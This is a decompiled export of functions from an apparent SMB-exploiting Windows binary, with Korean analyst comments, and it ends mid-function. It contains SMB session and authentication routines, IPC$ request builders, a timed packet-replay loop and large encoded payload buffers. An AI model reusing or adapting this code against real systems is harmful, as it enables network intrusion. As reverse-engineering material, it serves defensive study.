// Combined export of all functions at 20250527_192857

// --- Metadata ---
// Function Name: sub_401000
// Address: 0x401000
// Signature: unknown_signature
// ---------------
int __thiscall sub_401000(void *this)
{
  sub_401010(this);
  return atexit(sub_401040);
}


// --- Metadata ---
// Function Name: sub_401010
// Address: 0x401010
// Signature: unknown_signature
// ---------------
_BYTE *__fastcall sub_401010(int a1)
{
  __int16 v2; // [esp+0h] [ebp-2h] BYREF

  v2 = HIWORD(a1);
  return sub_408200(&dword_431468, &v2 + 1, &v2);
}


// --- Metadata ---
// Function Name: sub_401040
// Address: 0x401040
// Signature: unknown_signature
// ---------------
void __cdecl sub_401040()
{
  int *v0; // edi
  int v1; // ecx
  int v2; // eax
  void **i; // ebx
  int v4; // eax
  void **v5; // edi
  _DWORD *v6; // eax
  _DWORD *v7; // ebx
  void *v8; // esi
  int *v9; // [esp+0h] [ebp-Ch] BYREF
  char v10[4]; // [esp+4h] [ebp-8h] BYREF
  int v11; // [esp+8h] [ebp-4h] BYREF

  v0 = *(&dword_431468 + 1);
  v1 = *(&dword_431468 + 3);
  v2 = *v0;
  v9 = *v0;
  if ( v1 )
  {
    v4 = *&FileName[280];
    v5 = v0[1];
    for ( i = v5; v5 != *&FileName[280]; i = v5 )
    {
      freeRedBlackTree_4089D0(v5[2]);
      v5 = *v5;
      freeBlock_4097FE(i);
      v4 = *&FileName[280];
    }
    *(*(&dword_431468 + 1) + 4) = v4;
    v6 = *(&dword_431468 + 1);
    *(&dword_431468 + 3) = 0;
    *v6 = v6;
    *(*(&dword_431468 + 1) + 8) = *(&dword_431468 + 1);
    sub_4082B0(&dword_431468, v10);
  }
  else if ( v2 != v0 )
  {
    do
    {
      v7 = v2;
      rbTreeNextInOrder_408A10(&v9);
      rbTreeDelete_4085D0(&dword_431468, &v11, v7);
      v2 = v9;
    }
    while ( v9 != v0 );
  }
  freeBlock_4097FE(*(&dword_431468 + 1));
  *(&dword_431468 + 1) = 0;
  *(&dword_431468 + 3) = 0;
  v8 = 0;
  std::_Lockit::_Lockit(&v9);
  if ( !--*&FileName[276] )
  {
    v8 = *&FileName[280];
    *&FileName[280] = 0;
  }
  std::_Lockit::~_Lockit(&v9);
  if ( v8 )
    freeBlock_4097FE(v8);
}


// --- Metadata ---
// Function Name: searchSubstring_401140
// Address: 0x401140
// Signature: unknown_signature
// ---------------
char *__cdecl searchSubstring_401140(char *a1, const char *a2, int a3)
{
  unsigned int v3; // kr04_4
  char *result; // eax
  char *v5; // ebx

  v3 = strlen(a2) + 1;                          // strstr와 유사하지만, 검색 범위를 제한 
  result = a1;
  v5 = &a1[a3 - (v3 - 1)];
  if ( a1 > v5 )
    return 0;
  while ( memcmp(result, a2, (v3 - 1)) )        // 문자열 a1에서 문자열 a2가 처음으로 등장하는 위치를 찾음 
  {
    if ( ++result > v5 )
      return 0;
  }
  return result;
}


// --- Metadata ---
// Function Name: replacePlaceholders_401190
// Address: 0x401190
// Signature: unknown_signature
// ---------------
int __cdecl replacePlaceholders_401190(char *a1, int a2, char *a3, char *a4, char *a5)
{
  int v5; // ebp
  char *v6; // esi
  char *v7; // edi
  char *v8; // eax
  int v9; // edx
  char *v10; // eax
  int v11; // edx
  char *v13; // [esp+10h] [ebp-4h]

  v5 = a2;
  v6 = a1;
  v7 = a1;                                      // 입력 문자열 a1에서 특정한 자리 표시자(placeholder) 문자열을 찾아, 해당 위치에 사용자 ID(a4)와 트리 ID(a5)를 각각 삽입하여 a3에 결과 문자열을 생성 
  v8 = searchSubstring_401140(a1, aUseridPlacehol, a2);
  v13 = v8;
  if ( v8 )
  {
    v9 = v8 - a1;
    qmemcpy(a3, a1, v8 - a1);
    a3[v9] = *a4;
    a3[v9 + 1] = a4[1];
    qmemcpy(&a3[v8 - a1 + 2], &v8[strlen(aUseridPlacehol)], a2 - (v8 - a1) - strlen(aUseridPlacehol));
    v6 = a1;
    v7 = a3;
    v5 = a2 - strlen(aUseridPlacehol) + 2;
  }
  v10 = searchSubstring_401140(v7, aTreeidPlacehol, v5);
  if ( v10 )
  {
    v11 = v10 - v7;
    qmemcpy(a3, v7, v10 - v7);
    a3[v11] = *a5;
    a3[v11 + 1] = a5[1];
    qmemcpy(&a3[v11 + 2], &v10[strlen(aUseridPlacehol)], v5 - v11 - strlen(aTreeidPlacehol));
    v6 = a1;
    v5 += 2 - strlen(aTreeidPlacehol);
  }
  if ( !v13 && !v10 )
    qmemcpy(a3, v6, v5);
  return v5;
}


// --- Metadata ---
// Function Name: closeAllClientSockets_401310
// Address: 0x401310
// Signature: unknown_signature
// ---------------
_DWORD *closeAllClientSockets_401310()
{
  _DWORD *result; // eax
  _DWORD *v1; // esi
  _DWORD **v2; // eax

  result = dword_43146C;
  v1 = *dword_43146C;
  while ( v1 != dword_43146C )                  // 레드-블랙 트리 형태의 구조에서 노드를 순회하면서 소켓을 닫고 다음 노드로 이동 
  {
    closesocket(v1[4]);
    v2 = v1[2];
    if ( v2 == *&FileName[280] )
    {
      for ( result = v1[1]; v1 == result[2]; result = result[1] )
        v1 = result;
      if ( v1[2] != result )
        v1 = result;
    }
    else
    {
      v1 = v1[2];
      for ( result = *v2; result != *&FileName[280]; result = *result )
        v1 = result;
    }
  }
  return result;
}


// --- Metadata ---
// Function Name: manageConnectedClient_401370
// Address: 0x401370
// Signature: unknown_signature
// ---------------
void __cdecl manageConnectedClient_401370(char *serverIp, u_short serverPort)
{
  __int16 *cmdEntry; // esi 레드 블랙트리를 활용한 연결된 클라이언트 관리 
  double v3; // st7
  __int16 cmdCode; // ax
  SOCKET v5; // edi
  int v6; // edi
  char v7; // [esp+10h] [ebp-2F84h] BYREF
  char v8; // [esp+11h] [ebp-2F83h]
  char v9; // [esp+12h] [ebp-2F82h] BYREF
  char v10; // [esp+13h] [ebp-2F81h]
  __int64 prevTick; // [esp+14h] [ebp-2F80h] BYREF
  int v12[2]; // [esp+1Ch] [ebp-2F78h] BYREF
  int v13[2]; // [esp+24h] [ebp-2F70h] BYREF
  double currTick; // [esp+2Ch] [ebp-2F68h]
  int v15[2]; // [esp+34h] [ebp-2F60h] BYREF
  int v16[2]; // [esp+3Ch] [ebp-2F58h] BYREF
  __int64 v17; // [esp+44h] [ebp-2F50h]
  int v18; // [esp+4Ch] [ebp-2F48h] BYREF
  int v19; // [esp+54h] [ebp-2F40h] BYREF
  double intervalMs; // [esp+5Ch] [ebp-2F38h]
  struct sockaddr name; // [esp+64h] [ebp-2F30h] BYREF
  int v22; // [esp+74h] [ebp-2F20h] BYREF
  int v23; // [esp+7Ch] [ebp-2F18h] BYREF
  char recvBuf[2048]; // [esp+84h] [ebp-2F10h] BYREF
  char buf[10000]; // [esp+884h] [ebp-2710h] BYREF

  v7 = 0;
  v8 = 8;
  v9 = 0;
  v10 = 8;
  prevTick = GetTickCount();
  currTick = prevTick;
  initSomeBigData_401D80();
  rbTreeDeleteRange(&dword_431468, &prevTick, *dword_43146C, dword_43146C);
  cmdEntry = &word_431480;
  while ( 1 )
  {
    intervalMs = *(cmdEntry + 1252) * 1000.0;
    prevTick = GetTickCount();
    v3 = intervalMs - (prevTick - currTick);
    if ( v3 > 0.0 )
      preciseSleep_401660((v3 * 1000.0));
    v17 = GetTickCount();
    cmdCode = *cmdEntry;
    currTick = v17;
    if ( cmdCode == 2 )
      break;
    if ( cmdCode == 3 )
    {
      v13[0] = *(cmdEntry + 1);
      v13[1] = 0;
      rbInsertOrFind_408390(&dword_431468, &v23, v13);
      closesocket(*(v23 + 16));
    }
    else if ( cmdCode )
    {
      if ( cmdCode == 1 )
      {
        v12[0] = *(cmdEntry + 1);
        v12[1] = 0;
        rbInsertOrFind_408390(&dword_431468, &v19, v12);
        if ( recv(*(v19 + 16), recvBuf, 2048, 0) == -1 )
          goto LABEL_24;
        if ( *(cmdEntry + 2) > 3 )
        {
          if ( !stricmp(cmdEntry + 12, String2) )
          {
            v9 = recvBuf[28];
            v10 = recvBuf[29];
          }
          if ( !stricmp(cmdEntry + 12, aUserid) )
          {
            v7 = recvBuf[32];
            v8 = recvBuf[33];
          }
        }
      }
    }
    else
    {
      memset(buf, 0, sizeof(buf));
      v6 = replacePlaceholders_401190(cmdEntry + 12, *(cmdEntry + 2), buf, &v7, &v9);
      v15[0] = *(cmdEntry + 1);
      v15[1] = 0;
      rbInsertOrFind_408390(&dword_431468, &v22, v15);
      if ( send(*(v22 + 16), buf, v6, 0) == -1 )
        goto LABEL_24;
    }
LABEL_20:
    cmdEntry += 5012;
    if ( cmdEntry >= &unk_5FFD08 )
      return;
  }
  name.sa_family = 2;
  *&name.sa_data[2] = inet_addr(serverIp);
  *name.sa_data = htons(serverPort);
  v5 = socket(2, 1, 0);
  if ( v5 == -1 )
  {
    closeAllClientSockets_401310();
    return;
  }
  if ( connect(v5, &name, 16) != -1 )
  {
    v16[0] = *(cmdEntry + 1);
    v16[1] = 0;
    rbInsertOrFind_408390(&dword_431468, &v18, v16);
    *(v18 + 16) = v5;
    goto LABEL_20;
  }
  closesocket(v5);
LABEL_24:
  closeAllClientSockets_401310();
  Sleep(0x3E8u);
}


// --- Metadata ---
// Function Name: preciseSleep_401660
// Address: 0x401660
// Signature: unknown_signature
// ---------------
void __cdecl preciseSleep_401660(LARGE_INTEGER a1)
{
  int v1; // edi
  signed int v2; // esi
  unsigned int v3; // ebp
  signed int v4; // ebx
  LARGE_INTEGER v5; // rdi
  LARGE_INTEGER PerformanceCount; // [esp+Ch] [ebp-10h] BYREF
  LARGE_INTEGER Frequency; // [esp+14h] [ebp-8h] BYREF

  v1 = a1.QuadPart / 1000000;
  v2 = 1000 * (a1.QuadPart % 1000000);
  a1.LowPart = v2;
  if ( v1 > 0 )                                 // 정확한 지연(sleep)을 위해 성능 타이머(QueryPerformanceCounter)와 일반 슬립을 조합한 고정밀 Sleep 함수 
  {
    Sleep(v2 / 1000000 + 1000 * v1);
    return;
  }
  if ( dbl_431450 == 0.0 )
  {
    if ( !QueryPerformanceFrequency(&Frequency) )
    {
      Sleep(v2 / 1000000);
      return;
    }
    dbl_431450 = Frequency.QuadPart * 0.000000001;
  }
  a1.HighPart = (a1.LowPart * dbl_431450) >> 32;
  v3 = (a1.LowPart * dbl_431450);
  v4 = v2 / 1000000 - 10;
  QueryPerformanceCounter(&PerformanceCount);
  v5.QuadPart = __PAIR64__(a1.HighPart, v3) + PerformanceCount.QuadPart;
  if ( v4 > 0 )
    Sleep(v4);
  QueryPerformanceCounter(&a1);
  while ( a1.QuadPart < v5.QuadPart )
    QueryPerformanceCounter(&a1);
}


// --- Metadata ---
// Function Name: replace_placeholders_with_ipc_path_4017B0
// Address: 0x4017B0
// Signature: unknown_signature
// ---------------
int __cdecl replace_placeholders_with_ipc_path_4017B0(const char *a1, char *a2)
{
  int finalLength; // ebx
  unsigned int v3; // kr04_4
  char *placeholderPos; // eax
  int v5; // edx
  int v6; // ebx
  char v7; // al
  char *v8; // eax
  char *v10; // [esp+10h] [ebp-4D0h]
  char Buffer; // [esp+18h] [ebp-4C8h] BYREF
  char v12[196]; // [esp+19h] [ebp-4C7h] BYREF
  __int16 v13; // [esp+DDh] [ebp-403h]
  char v14; // [esp+DFh] [ebp-401h]
  char modifiedTemplate[1024]; // [esp+E0h] [ebp-400h] BYREF

  Buffer = 0;
  memset(v12, 0, sizeof(v12));
  v13 = 0;
  v14 = 0;
  finalLength = 95;
  sprintf(&Buffer, "\\\\%s\\IPC$", a1);         // 최종 결과는 공유 폴더(\\<IP>\IPC$) 경로를 포함한 문자열로 만들어짐 
  v3 = strlen(&Buffer) + 1;
  placeholderPos = searchSubstring_401140(byte_42E494, aUseridPlacehol, 95);
  v10 = placeholderPos;
  if ( placeholderPos )
  {
    v6 = 95 - (placeholderPos - byte_42E494);
    v5 = placeholderPos - byte_42E494;
    qmemcpy(modifiedTemplate, byte_42E494, placeholderPos - byte_42E494);
    v7 = a2[1];
    modifiedTemplate[v5] = *a2;
    modifiedTemplate[v5 + 1] = v7;              // 템플릿 문자열(byte_42E494) 안의 특정 플레이스홀더(aUseridPlacehol, aTreepathReplac)를 주어진 정보(a1, a2)로 교체하여 최종 문자열을 구성 
    qmemcpy(&modifiedTemplate[v5 + 2], &v10[strlen(aUseridPlacehol)], v6 - strlen(aUseridPlacehol));
    finalLength = 97 - strlen(aUseridPlacehol);
  }
  v8 = searchSubstring_401140(modifiedTemplate, aTreepathReplac, finalLength);
  if ( v8 )
  {
    qmemcpy(byte_42E494, modifiedTemplate, v8 - modifiedTemplate);
    qmemcpy(&byte_42E494[v8 - modifiedTemplate], &Buffer, v3);
    qmemcpy(
      &byte_42E494[v8 - modifiedTemplate + v3],
      &v8[strlen(aTreepathReplac)],
      finalLength - (v8 - modifiedTemplate) - strlen(aTreepathReplac));
    finalLength += v3 - strlen(aTreepathReplac);
  }
  byte_42E497 = finalLength - 4;
  return finalLength;
}


// --- Metadata ---
// Function Name: smbBruteforce_401980
// Address: 0x401980
// Signature: unknown_signature
// ---------------
int __cdecl smbBruteforce_401980(char *cp, u_short hostshort)
{
  SOCKET v2; // eax
  SOCKET v3; // esi
  int v4; // eax
  char v6; // [esp+Ah] [ebp-412h] BYREF
  char v7; // [esp+Bh] [ebp-411h]
  struct sockaddr name; // [esp+Ch] [ebp-410h] BYREF
  char buf; // [esp+1Ch] [ebp-400h] BYREF
  char v10[1020]; // [esp+1Dh] [ebp-3FFh] BYREF
  __int16 v11; // [esp+419h] [ebp-3h]
  char v12; // [esp+41Bh] [ebp-1h]

  buf = 0;
  memset(v10, 0, sizeof(v10));
  v11 = 0;
  v12 = 0;
  name.sa_family = 2;
  *&name.sa_data[2] = inet_addr(cp);            // SMB를 이용한 네트워크 기반의 인증 시도 
  *name.sa_data = htons(hostshort);             // IP 주소와 사용자 정보를 기반으로 패킷을 구성하고, 이를 타깃 IP에 보내 응답을 수신한 후 특정 조건이 맞는지 확인 
  v2 = socket(2, 1, 0);
  v3 = v2;
  if ( v2 != -1 )
  {
    if ( connect(v2, &name, 16) != -1           // SMB (IPC$) 프로토콜을 통해 특정 IP의 포트로 연결한 후 일련의 명령을 송수신 
      && send(v3, ::buf, 88, 0) != -1
      && recv(v3, &buf, 1024, 0) != -1
      && send(v3, byte_42E42C, 103, 0) != -1
      && recv(v3, &buf, 1024, 0) != -1 )        // SMB 세션 설정 및 사용자 인증을 시도하며, 성공 시 전역 버퍼에 사용자 정보 등을 설정하고 1 반환 
    {
      v6 = v10[31];
      v7 = v10[32];
      v4 = replace_placeholders_with_ipc_path_4017B0(cp, &v6);
      if ( send(v3, byte_42E494, v4, 0) != -1 && recv(v3, &buf, 1024, 0) != -1 )
      {
        byte_42E510 = v10[27];
        byte_42E512 = v10[27];
        v6 = v10[31];
        byte_42E514 = v10[31];
        v7 = v10[32];
        byte_42E515 = v10[32];
        byte_42E511 = v10[28];
        byte_42E513 = v10[28];
        byte_42E516 = v10[33];
        byte_42E517 = v10[34];
        if ( send(v3, byte_42E4F4, 78, 0) != -1
          && recv(v3, &buf, 1024, 0) != -1
          && v10[8] == 5
          && v10[9] == 2
          && !v10[10]
          && v10[11] == -64 )
        {
          closesocket(v3);
          return 1;
        }
      }
    }
    closesocket(v3);
  }
  return 0;
}


// --- Metadata ---
// Function Name: check_smb_session_response_401B70
// Address: 0x401B70
// Signature: unknown_signature
// ---------------
int __cdecl check_smb_session_response_401B70(char *cp, int a2, u_short hostshort)
{
  SOCKET v3; // eax
  SOCKET v4; // esi
  char v5; // bl
  char v7; // [esp+Fh] [ebp-411h]
  struct sockaddr name; // [esp+10h] [ebp-410h] BYREF
  char buf; // [esp+20h] [ebp-400h] BYREF
  char v10[1020]; // [esp+21h] [ebp-3FFh] BYREF
  __int16 v11; // [esp+41Dh] [ebp-3h]
  char v12; // [esp+41Fh] [ebp-1h]

  buf = 0;
  name.sa_family = 2;
  memset(v10, 0, sizeof(v10));
  v11 = 0;
  v12 = 0;
  *&name.sa_data[2] = inet_addr(cp);
  *name.sa_data = htons(hostshort);             // 지정된 IP(cp)와 포트(hostshort)에 대해 TCP 소켓을 열기 
  v3 = socket(2, 1, 0);
  v4 = v3;
  if ( v3 != -1 )
  {
    if ( connect(v3, &name, 16) != -1           // 정해진 SMB 패킷 시퀀스(byte_42E544, byte_42E5D0, byte_42E65C, byte_42E6BC)를 송수신 
      && send(v4, byte_42E544, 137, 0) != -1
      && recv(v4, &buf, 1024, 0) != -1
      && send(v4, byte_42E5D0, 140, 0) != -1
      && recv(v4, &buf, 1024, 0) != -1 )        // SMB 세션을 열고, 특정 응답을 확인 
    {
      v5 = v10[31];
      byte_42E67C = v10[31];
      v7 = v10[32];
      byte_42E67D = v10[32];
      if ( send(v4, byte_42E65C, 96, 0) != -1 && recv(v4, &buf, 1024, 0) != -1 )
      {
        byte_42E6D8 = v10[27];
        byte_42E6D9 = v10[28];
        byte_42E6DC = v5;
        byte_42E6DD = v7;
        if ( send(v4, byte_42E6BC, 82, 0) != -1 && recv(v4, &buf, 1024, 0) != -1 && v10[33] == 81 )
        {
          if ( a2
            || (byte_42E6DE = 66,
                byte_42E6ED = 14,
                byte_42E6EE = 105,
                byte_42E6EF = 0,
                byte_42E6F0 = 0,
                send(v4, byte_42E6BC, 82, 0) != -1)
            && recv(v4, &buf, 1024, 0) != -1 )
          {
            closesocket(v4);
            return 1;
          }
        }
      }
    }
    closesocket(v4);
  }
  return 0;
}


// --- Metadata ---
// Function Name: initSomeBigData_401D80
// Address: 0x401D80
// Signature: unknown_signature
// ---------------
int initSomeBigData_401D80()
{
  int result; // eax
  char v1[1420]; // [esp+1Ch] [ebp-58Ch] BYREF

  result = 0;
  word_431480 = 2;
  dword_431484 = 1;
  dword_433BA0 = 0;
  dword_433BA4 = 0;
  word_433BA8 = 0;
  dword_433BAC = 1;
  dword_433BB0 = 137;
  qmemcpy(&unk_433BB4, &unk_41B924, 0x89u);
  dword_4362C8 = -1610612736;
  dword_4362CC = 1058650382;
  word_4362D0 = 1;
  dword_4362D4 = 1;
  dword_4389F0 = -1967128576;
  dword_4389F4 = 1065867104;
  word_4389F8 = 0;
  dword_4389FC = 1;
  dword_438A00 = 140;
  qmemcpy(&unk_438A04, &unk_41B9B0, 0x8Cu);
  dword_43B12C = 1919251317;
  word_43B130 = 25705;
  dword_43B118 = -1363148800;
  dword_43B11C = 1065876838;
  word_43B120 = 1;
  dword_43B124 = 1;
  dword_43B128 = 6;
  dword_43D840 = 171966464;
  dword_43D844 = 1065624583;
  word_43D848 = 0;
  dword_43D84C = 1;
  dword_43D850 = 113;
  qmemcpy(&unk_43D854, &unk_41BA3C, 0x71u);
  dword_43FF7C = 1701147252;
  word_43FF80 = 25705;
  dword_43FF68 = -1598029824;
  dword_43FF6C = 1065678173;
  word_43FF70 = 1;
  dword_43FF74 = 1;
  dword_43FF78 = 6;
  dword_442690 = -1881145344;
  dword_442694 = 1065667914;
  word_442698 = 0;
  dword_44269C = 1;
  dword_4426A0 = 1126;
  qmemcpy(&unk_4426A4, &unk_41BAB0, 0x99u);
  dword_444DB8 = -75497472;
  dword_444DBC = 1066230297;
  word_444DC0 = 1;
  dword_444DC4 = 1;
  dword_4474E0 = -1505755136;
  dword_4474E4 = 1065887001;
  word_4474E8 = 0;
  dword_4474EC = 1;
  dword_4474F0 = 1502;
  qmemcpy(&unk_4474F4, &unk_41BB4C, 0x63u);
  dword_449C08 = 1663041536;
  dword_449C0C = 1065940736;
  word_449C10 = 0;
  dword_449C14 = 1;
  dword_449C18 = 1460;
  qmemcpy(&unk_449E9C, &unk_41BBB0, 0x334u);
  dword_44C330 = -1342177280;
  dword_44C334 = 1061398789;
  word_44C338 = 0;
  dword_44C33C = 1;
  dword_44C340 = 1233;
  qmemcpy(&unk_44C344, aH5dh0rqsynfebx, 0x4D1u);
  dword_44EA58 = -805306368;
  dword_44EA5C = 1058307695;
  word_44EA60 = 0;
  dword_44EA64 = 1;
  dword_44EA68 = 1502;
  qmemcpy(&unk_44EA6C, &unk_41C3B8, 0x5DEu);
  dword_451180 = -713031680;
  dword_451184 = 1066323315;
  word_451188 = 0;
  dword_45118C = 1;
  dword_451190 = 1460;
  qmemcpy(&unk_451194, aBbcub5x4jixypy, 0x5B4u);
  dword_4538A8 = -1073741824;
  dword_4538AC = 1061554387;
  word_4538B0 = 0;
  dword_4538B4 = 1;
  dword_4538B8 = 1502;
  qmemcpy(word_4538BC, &aBbcub5x4jixypy[1460], 0x5DCu);
  word_4538BC[750] = unk_41D528;
  dword_455FD0 = 1140850688;
  dword_455FD4 = 1061158799;
  word_455FD8 = 0;
  dword_455FDC = 1;
  dword_455FE0 = 1460;
  qmemcpy(&unk_455FE4, aKholxoqanIjmrd, 0x5B4u);
  dword_4586F8 = 0x80000000;
  dword_4586FC = 1057854230;
  word_458700 = 0;
  dword_458704 = 1;
  dword_458708 = 1460;
  qmemcpy(&unk_45870C, &aKholxoqanIjmrd[1460], 0x5B4u);
  dword_45AE20 = -2101346304;
  dword_45AE24 = 1066041029;
  word_45AE28 = 0;
  dword_45AE2C = 1;
  dword_45AE30 = 1006;
  qmemcpy(word_45AE34, &aKholxoqanIjmrd[2920], 0x3ECu);
  word_45AE34[502] = *&aKholxoqanIjmrd[3924];
  dword_45D548 = 0x80000000;
  dword_45D54C = 1057476376;
  word_45D550 = 0;
  dword_45D554 = 1;
  dword_45D558 = 1502;
  qmemcpy(&unk_45D55C, &unk_41E484, 0x5DEu);
  dword_45FC70 = 1610612736;
  dword_45FC74 = 1061164108;
  word_45FC78 = 0;
  dword_45FC7C = 1;
  dword_45FC80 = 1460;
  qmemcpy(&unk_45FC84, aQspsrs0cvhiguu, 0x5B4u);
  dword_462398 = -1342177280;
  dword_46239C = 1060350417;
  word_4623A0 = 0;
  dword_4623A4 = 1;
  dword_4623A8 = 1233;
  qmemcpy(byte_4623AC, &aQspsrs0cvhiguu[1460], 0x4D0u);
  byte_4623AC[1232] = aQspsrs0cvhiguu[2692];
  dword_464AC0 = 1174405120;
  dword_464AC4 = 1062070984;
  word_464AC8 = 0;
  dword_464ACC = 1;
  dword_464AD0 = 1502;
  qmemcpy(&unk_464AD4, &unk_41F4EC, 0x5DEu);
  dword_4671E8 = -402653184;
  dword_4671EC = 1061032973;
  word_4671F0 = 0;
  dword_4671F4 = 1;
  dword_4671F8 = 1460;
  qmemcpy(&unk_4671FC, a5bWjeSecei897c, 0x5B4u);
  dword_469910 = 1711276032;
  dword_469914 = 1061198006;
  word_469918 = 0;
  dword_46991C = 1;
  dword_469920 = 1233;
  qmemcpy(byte_469924, &a5bWjeSecei897c[1460], 0x4D0u);
  byte_469924[1232] = a5bWjeSecei897c[2692];
  dword_46C038 = -402653184;
  dword_46C03C = 1060161464;
  word_46C040 = 0;
  dword_46C044 = 1;
  dword_46C048 = 1502;
  qmemcpy(&unk_46C04C, &unk_420554, 0x5DEu);
  dword_46E760 = 1526726656;
  dword_46E764 = 1066072997;
  word_46E768 = 0;
  dword_46E76C = 1;
  dword_46E770 = 1460;
  qmemcpy(&unk_46E774, aXuezwscy9wd5nx, 0x5B4u);
  dword_470E88 = -939524096;
  dword_470E8C = 1059580726;
  word_470E90 = 0;
  dword_470E94 = 1;
  dword_470E98 = 1233;
  qmemcpy(byte_470E9C, &aXuezwscy9wd5nx[1460], 0x4D0u);
  byte_470E9C[1232] = aXuezwscy9wd5nx[2692];
  dword_4735B0 = 0x80000000;
  dword_4735B4 = 1056279572;
  word_4735B8 = 0;
  dword_4735BC = 1;
  dword_4735C0 = 1502;
  qmemcpy(&unk_4735C4, &unk_4215BC, 0x5DEu);
  dword_475CD8 = 0;
  dword_475CDC = 1056489648;
  word_475CE0 = 0;
  dword_475CE4 = 1;
  dword_475CE8 = 1460;
  qmemcpy(&unk_475CEC, a7cnwqohghrhlih, 0x5B4u);
  dword_478400 = -973078528;
  dword_478404 = 1061734956;
  word_478408 = 0;
  dword_47840C = 1;
  dword_478410 = 1233;
  qmemcpy(byte_478414, &a7cnwqohghrhlih[1460], 0x4D0u);
  byte_478414[1232] = a7cnwqohghrhlih[2692];
  dword_47AB28 = 0;
  dword_47AB2C = 1057326946;
  word_47AB30 = 0;
  dword_47AB34 = 1;
  dword_47AB38 = 1502;
  qmemcpy(&unk_47AB3C, &unk_422624, 0x5DEu);
  dword_47D250 = 1428160512;
  dword_47D254 = 1066480455;
  word_47D258 = 0;
  dword_47D25C = 1;
  dword_47D260 = 1460;
  qmemcpy(&unk_47D264, aOrcgjkrfEswaxd, 0x5B4u);
  dword_47F978 = -469762048;
  dword_47F97C = 1061139660;
  word_47F980 = 0;
  dword_47F984 = 1;
  dword_47F988 = 1233;
  qmemcpy(byte_47F98C, &aOrcgjkrfEswaxd[1460], 0x4D0u);
  byte_47F98C[1232] = aOrcgjkrfEswaxd[2692];
  dword_4820A0 = -536870912;
  dword_4820A4 = 1057475276;
  word_4820A8 = 0;
  dword_4820AC = 1;
  dword_4820B0 = 1502;
  qmemcpy(&unk_4820B4, &unk_42368C, 0x5DEu);
  dword_4847C8 = 0x20000000;
  dword_4847CC = 1058239148;
  word_4847D0 = 0;
  dword_4847D4 = 1;
  dword_4847D8 = 1460;
  qmemcpy(&unk_4847DC, a17pxljqfbstlin, 0x5B4u);
  dword_486EF0 = 1879048192;
  dword_486EF4 = 1059780743;
  word_486EF8 = 0;
  dword_486EFC = 1;
  dword_486F00 = 1233;
  qmemcpy(byte_486F04, &a17pxljqfbstlin[1460], 0x4D0u);
  byte_486F04[1232] = a17pxljqfbstlin[2692];
  dword_489618 = 1879048192;
  dword_48961C = 1058844635;
  word_489620 = 0;
  dword_489624 = 1;
  dword_489628 = 1502;
  qmemcpy(&unk_48962C, &unk_4246F4, 0x5DEu);
  dword_48BD40 = 1310720000;
  dword_48BD44 = 1066535581;
  word_48BD48 = 0;
  dword_48BD4C = 1;
  dword_48BD50 = 1460;
  qmemcpy(&unk_48BD54, aLiukxrawfspj4k, 0x5B4u);
  dword_48E468 = 0x20000000;
  dword_48E46C = 1057617526;
  word_48E470 = 0;
  dword_48E474 = 1;
  dword_48E478 = 1233;
  qmemcpy(byte_48E47C, &aLiukxrawfspj4k[1460], 0x4D0u);
  byte_48E47C[1232] = aLiukxrawfspj4k[2692];
  dword_490B90 = -536870912;
  dword_490B94 = 1058346762;
  word_490B98 = 0;
  dword_490B9C = 1;
  dword_490BA0 = 1502;
  qmemcpy(&unk_490BA4, &unk_42575C, 0x5DEu);
  dword_4932B8 = 1342177280;
  dword_4932BC = 1058037061;
  word_4932C0 = 0;
  dword_4932C4 = 1;
  dword_4932C8 = 1460;
  qmemcpy(&unk_4932CC, a66ntowjxpbzgfq, 0x5B4u);
  dword_4959E0 = 402653184;
  dword_4959E4 = 1060200476;
  word_4959E8 = 0;
  dword_4959EC = 1;
  dword_4959F0 = 1233;
  qmemcpy(byte_4959F4, &a66ntowjxpbzgfq[1460], 0x4D0u);
  byte_4959F4[1232] = a66ntowjxpbzgfq[2692];
  dword_498108 = -1073741824;
  dword_49810C = 1057472493;
  word_498110 = 0;
  dword_498114 = 1;
  dword_498118 = 1502;
  qmemcpy(&unk_49811C, &unk_4267C4, 0x5DEu);
  dword_49A830 = -564133888;
  dword_49A834 = 1066297035;
  word_49A838 = 0;
  dword_49A83C = 1;
  dword_49A840 = 1460;
  qmemcpy(&unk_49A844, aFqhnj2W4kjrlvj, 0x5B4u);
  dword_49CF58 = -2013265920;
  dword_49CF5C = 1061550103;
  word_49CF60 = 0;
  dword_49CF64 = 1;
  dword_49CF68 = 1233;
  qmemcpy(byte_49CF6C, &aFqhnj2W4kjrlvj[1460], 0x4D0u);
  byte_49CF6C[1232] = aFqhnj2W4kjrlvj[2692];
  dword_49F680 = -1073741824;
  dword_49F684 = 1057419682;
  word_49F688 = 0;
  dword_49F68C = 1;
  dword_49F690 = 1502;
  qmemcpy(&unk_49F694, &unk_42782C, 0x5DEu);
  dword_4A1DA8 = 1610612736;
  dword_4A1DAC = 1058000259;
  word_4A1DB0 = 0;
  dword_4A1DB4 = 1;
  dword_4A1DB8 = 1460;
  qmemcpy(&unk_4A1DBC, aFlqcc7cahqmkny, 0x5B4u);
  dword_4A44D0 = 570425344;
  dword_4A44D4 = 1061309611;
  word_4A44D8 = 0;
  dword_4A44DC = 1;
  dword_4A44E0 = 1233;
  qmemcpy(byte_4A44E4, &aFlqcc7cahqmkny[1460], 0x4D0u);
  byte_4A44E4[1232] = aFlqcc7cahqmkny[2692];
  dword_4A6BF8 = 0;
  dword_4A6BFC = 1057442051;
  word_4A6C00 = 0;
  dword_4A6C04 = 1;
  dword_4A6C08 = 1502;
  qmemcpy(&unk_4A6C0C, &unk_428894, 0x5DEu);
  dword_4A9320 = -1056964608;
  dword_4A9324 = 1066306518;
  word_4A9328 = 0;
  dword_4A932C = 1;
  dword_4A9330 = 1460;
  qmemcpy(&unk_4A9334, aTzfxh4tramapth, 0x5B4u);
  dword_4ABA48 = 1610612736;
  dword_4ABA4C = 1057549150;
  word_4ABA50 = 0;
  dword_4ABA54 = 1;
  dword_4ABA58 = 1233;
  qmemcpy(byte_4ABA5C, &aTzfxh4tramapth[1460], 0x4D0u);
  byte_4ABA5C[1232] = aTzfxh4tramapth[2692];
  dword_4AE170 = 0x10000000;
  dword_4AE174 = 1058281548;
  word_4AE178 = 0;
  dword_4AE17C = 1;
  dword_4AE180 = 1502;
  qmemcpy(&unk_4AE184, &unk_4298FC, 0x5DEu);
  dword_4B0898 = 1610612736;
  dword_4B089C = 1057111510;
  word_4B08A0 = 0;
  dword_4B08A4 = 1;
  dword_4B08A8 = 1460;
  qmemcpy(&unk_4B08AC, aPxqiz0o6nbhx0b, 0x5B4u);
  dword_4B2FC0 = 1610612736;
  dword_4B2FC4 = 1061854728;
  word_4B2FC8 = 0;
